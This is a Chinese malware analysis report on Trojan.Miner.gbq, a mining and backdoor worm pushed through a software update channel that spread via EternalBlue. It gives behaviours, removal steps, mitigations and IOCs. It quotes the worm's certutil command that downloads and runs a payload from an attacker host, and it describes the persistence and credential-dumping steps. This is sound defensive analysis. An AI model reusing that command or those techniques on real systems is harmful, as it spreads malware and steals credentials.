**2018年12月一款通过驱动人生升级通道下发传播的木马爆发，该木马同时利用了永恒之蓝高危漏洞进行传播，最终导致了仅2个小时受攻击的用户就高达10万，造成了严重的危害。**  

## 一、病毒信息

 **病毒名称：** Trojan.Miner.gbq。

 **病毒类型：** 挖矿程序，后门，蠕虫。

 **MD** **5** **：** 59b18d6146a2aa066f661599c496090d。

 **SHA1：** 48a3046381a963a2471875ef67886e35b90e8541。

 **文件类型：** PE、EXE。

 **文件大小：** 201,776 字节。

 **传播途径：** 通过驱动人生的升级通道下发。

 **影响系统：** 安装了受影响的驱动人生程序的Windows系统，内网中未打MS17-010系统补丁且开启445端口的Windows系统。

## 二、病毒概况

2019年1月24日，攻击者通过云控指令对该木马又进行了新的更新，更新文件下载URL：http[:]//dl.haqo.net/updater.exe，MD5：59b18d6146a2aa066f661599c496090d，下载到本地保存的路径为：C:\Windows\temp\updater.exe，该恶意代码执行后便会将自身移动到系统关键目录并释放多个文件执行，上传主机的相关信息并从指定的恶意域名查询指令，根据云端指令执行恶意行为，当前云端的指令仅仅是控制感染主机进行挖矿操作，后续攻击者可以根据需要改变云端指令，从而控制感染主机执行更加危险的操作。

## 三、病毒危害

感染主机将接受恶意攻击者下发的任意指令执行恶意操作，当前下发的指令是控制感染主机进行挖矿操作，影响用户的主机性能，同时下载永恒之蓝利用工具实现内网的感染操作，从而实现组建僵尸网络的目的。

## 四、文件行为

1).下载保存文件到c:\windows\temp\updater.exe，执行后移动到其他位置；

2).移动文件到c:\windows\system32\svhost.exe，并设置隐藏属性；

3).拷贝文件到c:\windows\system32\drivers\svchost.exe，并设置隐藏属性；

4).释放文件到c:\windows\system32\drivers\taskmgr.exe，并设置隐藏属性；

5).释放文件到c:\windows\system32\wmiex.exe，并设置隐藏属性；

6).下载文件到c:\windows\temp\svchost，此文件为永恒之蓝漏洞利用工具；

7).释放文件到c:\windows\temp\m.ps1，此文件为mimikatz密码hash提取工具；

8).释放文件到c:\windows\temp\mkatz.ini，此文件包含提取本机用户的hash值。

注：在Windows64位系统中c:\windows\system32替换为c\windows\SysWOW64；

## 五、注册表行为

1).添加注册表项：

    
    
    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Ddriver
    
    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebServers

## 六、网络行为

1).尝试上传主机信息到http[:]//i.haqo.net；

2).尝试上传主机信息到http[:]//p.abbny.com；

3).尝试上传主机信息到http[:]//o.beahh.com；

4).尝试上传主机信息到http[:]//ii.haqo.net；

5).尝试上传主机信息到http[:]//pp.abbny.com；

6).尝试上传主机信息到http[:]//oo.beahh.com；

7).尝试获取远控指令信息http[:]//i.haqo.net/i.png；

8).尝试获取远控指令信息http[:]//p.abbny.com/im.png；

9).尝试获取远控指令信息http[:]//o.beahh.com/i.png；

10).尝试获取远控指令信息http[:]//ii.haqo.net/u.png；

11).尝试获取远控指令信息http[:]//pp.abbny.com/u.png；

12).尝试获取远控指令信息http[:]//oo.beahh.com/u.png；

## 七、手工清除方法

1).删除计划任务，结束病毒进程并删除服务：

> Ÿ 删除名为Ddrivers和WebServers的计划任务；
>
> Ÿ 删除名为DnsScan的计划任务；
>
> Ÿ 删除名为\Microsoft\Windows\Bluetooths的计划任务；
>
> Ÿ 删除可能存在的计划任务Certificate；
>
> Ÿ 删除可能存在的计划任务Credentials；
>
> Ÿ
> 结束名为wmiex.exe进程以及描述为“svchost”的svchost进程；（注：通常正常的svchost进程描述为“Windows服务主进程”）；
>
> Ÿ 删除名为Ddriver和WebServers的服务项；

2).删除下载和释放的病毒文件，路径如下：

> Ÿ c:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start
> Menu\Programs\Startup\run.bat(注:[Username] 替换为当前登录的用户名)；
>
> Ÿ
> c:\Users\\[Username]\AppData\Roaming\Microsoft\cred.ps1(注:[Username]替换为当前登录的用户名)；
>
> Ÿ c:\programdata\microsoft\cred.ps1；
>
> Ÿ c:\windows\temp\updater.exe；
>
> Ÿ c:\windows\system32\svhost.exe；
>
> Ÿ c:\windows\system32\drivers\svchost.exe；
>
> Ÿ c:\windows\system32\drivers\taskmgr.exe；
>
> Ÿ c:\windows\system32\wmiex.exe；
>
> Ÿ c:\windows\temp\svchost；
>
> Ÿ c:\windows\temp\m.ps1；
>
> Ÿ c:\windows\temp\mkatz.ini；

3).删除病毒创建的注册表项：

> Ÿ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Ddriver；
>
> Ÿ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebServers；

4).删除病毒设置的防火墙栏目：

> Ÿ 删除入站规则名为UDP，开放65532端口的规则；
>
> Ÿ 删除入站规则名为UDP2，开放65531端口的规则；
>
> Ÿ 删除入站规则名为ShareService，开放65533端口的规则；

5).删除病毒设置的端口转发的设置

CMD管理员执行如下命令：

> Ÿ netsh interface portproxy delete v4tov4 listenport=65531
>
> Ÿ netsh interface portproxy delete v4tov4 listenport=65532

## 八、应对措施及建议

1).卸载老版本的驱动人生程序或者更新至最新版防止攻击者下发新的恶意代码；

2).内网使用共享的主机打上MS17-010漏洞补丁(补丁编号为KB4012212和KB4012215)，防止利用此漏洞的横向攻击；

3).内网使用共享的主机还需要打上KB2871997漏洞补丁，防止利用此漏洞的横向攻击；

4).安装好防病毒软件并及时更新病毒库以抵抗最新恶意代码的攻击。

## 九、详细分析报告

1).主程序启动后首先尝试启动名为Ddriver的服务进程，如果主机已经被感染则直接执行服务函数进行挖矿等恶意行为，如果主机是初次被感染则执行感染配置行为。

![图片1.png](https://image.3001.net/images/20190222/1550829039_5c6fc5ef4ccb1.png!small)

图1 主函数入口

2).第一步检查自身名称是否为svhost或者svchost.exe，如果程序名称不为svhost或者svchost.exe则从资源节中解密释放PE文件，释放文件的hash：
a4b7940b3d6b03269194f728610784d6，最终在磁盘中释放路径为C:\windows\temp\ttt.exe，释放完成后便执行该文件。

![图片2.png](https://image.3001.net/images/20190222/1550829080_5c6fc6180bbaf.png!small)

图2 释放主程序中102号资源文件

![图片3.png](https://image.3001.net/images/20190225/1551078671_5c73950f519fe.png!small)

图3 加密状态的102号资源文件

3).释放执行ttt.exe文件后便多次使用cmd命令清理系统原来感染的老版本的挖矿程序，为新版挖矿程序的安装和运行清理环境。

![图片4.png](https://image.3001.net/images/20190225/1551078713_5c7395392cd83.png!small)

图4 结束删除老版的挖矿程序

4).设置Windows防火墙开启65531，65532，65533端口，在防火墙规则中分别命名为UDP2，UDP，ShareService，同时开启端口转发，将来自65532端口的流量转发到1.1.1.1地址的53端口，将来自65531端口的流量转发到1.1.1.1地址的53端口。

![图片5.png](https://image.3001.net/images/20190225/1551078737_5c73955101962.png!small)

图5 设置防火墙并设置端口代理

![图片6.png](https://image.3001.net/images/20190225/1551078755_5c73956337111.png!small)

图6 Windows防火墙中的增项

![图片7.png](https://image.3001.net/images/20190225/1551078779_5c73957bf1971.png!small)

图7 端口代理

5).拷贝主程序到C:\windows\system32\svhost.exe并设置隐藏属性，同时拷贝一份到C:\windows\system32\drivers\svchost.exe，之后设置计划任务同时设置注册表项，实现程序的开机启动和定期触发执行。

![图片8.png](https://image.3001.net/images/20190225/1551078798_5c73958e7409c.png!small)

图8 拷贝主程序文件到系统关键目录下

![图片9.png](https://image.3001.net/images/20190225/1551078822_5c7395a61b6aa.png!small)

图9 设置计划任务和注册表项

6).完成上述配置后尝试使用CreateServiceA函数将C:\windows\system32\drivers\svchost.exe注册为服务，如果服务存在则修改服务配置，如果CreateServiceA函数调用失败则使用CMD方式调用sc
create创建服务，最终尝试使用net start和StartServiceA函数的方式启动服务函数。

![图片10.png](https://image.3001.net/images/20190225/1551078842_5c7395babf0c9.png!small)

图10 创建Ddriver服务的首选方式

![图片11.png](https://image.3001.net/images/20190225/1551078861_5c7395cd5938f.png!small)

图11 创建Ddriver服务的备用方式

![图片12.png](https://image.3001.net/images/20190225/1551078878_5c7395de9e94b.png!small)

图12 启动创建的Ddriver服务

7).服务主函数中首先根据系统位数拼接后续将要使用到的字符串资源，包括从而已域名临时下载的文件以及解密之后的文件，和后续用来伪装成任务管理器共享进程进行挖矿操作taskmgr.exe。

![图片13.png](https://image.3001.net/images/20190225/1551078897_5c7395f10dd6a.png!small)

图13 拼接后续需要使用的字符串

8). 创建名为“it is holy
shit”的互斥体防止进程重复启动运行，根据系统位数解密释放对应的资源文件，64位系统解密释放100号资源，32位系统解密释放标号为101号资源，释放路径为C:\Windows\system32\drivers\taskmgr.exe(64位系统：C:\Windows\SysWOW64\drivers\taskmgr.exe)。

![图片14.png](https://image.3001.net/images/20190225/1551078913_5c73960130982.png!small)

图14 利用互斥体防止进程重复启动

![图片15.png](https://image.3001.net/images/20190225/1551078929_5c73961154784.png!small)

图15 根据系统位数释放taskmgr.exe文件

9).之后创建四个线程分别进行相关的恶意操作，第一个线程根据主机中的进程和主机系统相关参数调整挖矿程序的运行状态，当用户打开任务管理器浏览时会自动关闭伪装程序taskmgr.exe，使其不被用户发现；第二个线程每隔10s尝试启动C:\Windows\temp\svchost.exe(永恒之蓝漏洞攻击文件)，实现内网的横向感染传播；第三个线程使用Wmic命令，每10秒对进程进行一次检查，触发时将结束挖矿进程；第四个线程打开监听65533端口。

![图片16.png](https://image.3001.net/images/20190225/1551078947_5c739623e7bc6.png!small)

图16 创建四个线程进行操作

![图片17.png](https://image.3001.net/images/20190225/1551078967_5c739637a06c9.png!small)

图17 根据主机进程决定是否暂时关闭伪装进程

![图片18.png](https://image.3001.net/images/20190225/1551078991_5c73964f22972.png!small)

图18 每隔10秒尝试启动永恒之蓝漏洞攻击文件

![图片19.png](https://image.3001.net/images/20190225/1551079008_5c7396600284e.png!small)

图19 每隔10秒使用WMIC检查进程并决定是否关闭挖矿程序

![图片20.png](https://image.3001.net/images/20190225/1551079023_5c73966fa3232.png!small)

图20 开启监听65533端口

10).收集主机信息并发送到远程服务器，收集的信息包括主机ID，GUID，MAC地址，用户名，系统版本，系统位数，CPU型号，安装的反病毒软件等等，最终在下载下一步指令的同时将上述信息传输到远程服务器。

![图片21.png](https://image.3001.net/images/20190225/1551079040_5c73968033fb4.png!small)

图21 收集发送到远程服务器的主机信息

11).之后尝试访问远程服务器中指定的文件内容，从而获取执行指令，在本地解密后解析执行指令，发送的指令通过RC4+RSA算法进行加密，本地获取指令后通过硬编码的RSA公钥进行解密，最终解析执行远程命令。

![图片22.png](https://image.3001.net/images/20190225/1551079068_5c73969ccaf3f.png!small)

图22 当前下发的指令密文

![图片23.png](https://image.3001.net/images/20190225/1551079096_5c7396b89b745.png!small)

图23 密文用于解密网址及资源路径并使用RSA算法验证指令合法性

12).由接受到的*.png中的指令内容下载指定的文件执行，当前指令的意图是从恶意域名http[:]//dl.haqo.net/下载i.exez资源，该资源为加密状态，下载到本地后解密执行，最终下载解密到C:\windows\temp\svchost.exe，目前下载的程序为永恒之蓝漏洞利用程序，该程序利用445端口实现了病毒的内网横向传播操作，该利用工具中还增加了PASS-THE-HASH的模块，尝试利用内网弱口令进行远程拷贝执行感染操作。

![图片24.png](https://image.3001.net/images/20190225/1551079120_5c7396d06a1ba.png!small)

图24 下载指定文件解密执行

13).释放的ttt.exe文件执行之后会将自身移动到C:\Windows\System32\wmiex.exe(64位系统：C:\Windows\SysWOW64\wmiex.exe)并设置了隐藏属性，将自身写入计划任务，任务名为WebServers，每隔50分钟执行一次C:\Windows\system32\wmiex.exe(64位系统：C:\Windows\SysWOW64\wmiex.exe)，并创建服务WebServers设置为开机自启动。

![图片25.png](https://image.3001.net/images/20190225/1551079150_5c7396eec12cb.png!small)

图25 释放的ttt.exe文件被移动到指定路径

![图片26.png](https://image.3001.net/images/20190225/1551079171_5c7397033c8e6.png!small)

图26 设置计划任务项使其定期触发

![图片27.png](https://image.3001.net/images/20190225/1551079219_5c7397334f40c.png!small)

图27 创建服务使其每次开机能够自启动

![图片28.png](https://image.3001.net/images/20190225/1551079236_5c739744f11ea.png!small)

图28 释放文件实现上述功能采用的命令行

14).WebServers服务启动后会向指定的三个域名发起Get请求将获取的主机相关信息发送到远程服务器，从而收集主机的相关信息，其中包含主机名，标识主机的GUID，主机MAC地址，主机系统和操作系统位数，其中pp.abbny.com和oo.beahh.com域名解析请求失败，ii.haqo.net解析IP为172.104.73.9（IP地址显示归属地为日本）。

![图片29.png](https://image.3001.net/images/20190225/1551079259_5c73975b50722.png!small)

图29 上传信息所到的恶意域名

![图片30.png](https://image.3001.net/images/20190225/1551079281_5c739771b21c8.png!small)

图30 上传信息主机信息

15).WebServers服务同时具备Ddriver服务的联网功能，通过尝试下载指定域名的u.png文件，图片文件中包含了加密的指令内容，攻击者可以通过编辑该文件从而控制感染主机进行任意操作，也可以修改指令改变所下发的指令内容，当前该文件并不存在，因此WebServers不会执行其他恶意行为，仅仅处于等待指令的状态，在每次开机以及开机状态后每隔50分钟检查接收一次远程指令，wmiex.exe中的代码和svchost主程序中网络相关的代码基本一致，RSA公钥也是一样的，因此在这里算是攻击者的一个重复性操作。

![图片31.png](https://image.3001.net/images/20190225/1551079309_5c73978ddef69.png!small)

图31 wmiex.exe和svchost.exe硬编码的公钥信息

16).内网利用漏洞进行传播，漏洞利用成功后远程执行命令:certutil -urlcache -split -f
http[:]//dl.haqo.net/dll.exe
c:/installs.exe，使受害主机主动到攻击者设置好的网站下载执行恶意代码，实现蠕虫式传播。

![图片32.png](https://image.3001.net/images/20190225/1551079330_5c7397a28596a.png!small)

图32 漏洞利用工具包

## 十、样本溯源分析

![图片33.png](https://image.3001.net/images/20190225/1551079359_5c7397bff0c86.png!small)

## 十一、附录(IOCs)  

### a)HASH

bdbfa96d17c2f06f68b3bcc84568cf445915e194f130b0dc2411805cf889b6cc  
b771267551961ce840a1fbcd65e8f5ecd0a21350387f35bbcd4c24125ec04530

01b842cab76c78a1d9860ade258923772fe3b08ae7a428d5f54e1bf9d9c3b205

735d9699b69b3ae2d27cbf452d488e1d1adbe643c8228e7093d012bf7fcff6de

57e4c156750f2ad1de1e22a5dd749a8dc4fedf88132c0ad6cb3506a838664dca

### b)C&C

i.haqo.net

ii.haqo.net

dl.haqo.net

o.beahh.com

oo.beahh.com

p.abbny.com

pp.abbny.com

172.104.73.9(日本)

68.183.178.71(美国)

139.162.107.97(日本)

153.92.4.49(美国)

120.52.51.13(中国河北省廊坊市)

 ***本文作者：江民安全实验室，转载请注明来自FreeBuf.COM**

